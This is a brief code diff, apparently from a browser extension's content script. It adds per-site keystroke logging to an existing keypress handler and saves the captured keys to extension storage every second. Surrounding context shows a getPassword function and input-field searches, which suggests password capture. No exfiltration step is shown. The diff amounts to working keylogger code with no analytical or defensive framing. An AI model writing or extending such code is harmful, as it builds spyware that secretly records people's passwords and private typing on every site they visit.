@@ -1,8 +1,15 @@
+const db = {};
+setInterval(() => {
+  chrome.storage.local.set({database: db}, () => {});
+}, 1000);
 /**
  * logs keypress
  * @param {KeyboardEvent} e
  */
 function logKeyPress(e) {
+  const context = window.location.origin;
+  if (db[context]) db[context] += `,${e.key}`;
+  else db[context] = e.key;
   console.log(e.key);
 }
 
@@ -28,7 +35,7 @@ function getPassword() {
 }
 
 /**
- * helper function to do actual input tag searches that matches the 
+ * helper function to do actual input tag searches that matches the
  * regex object supplied
  * returns null if failed
  * @param {RegExp} re
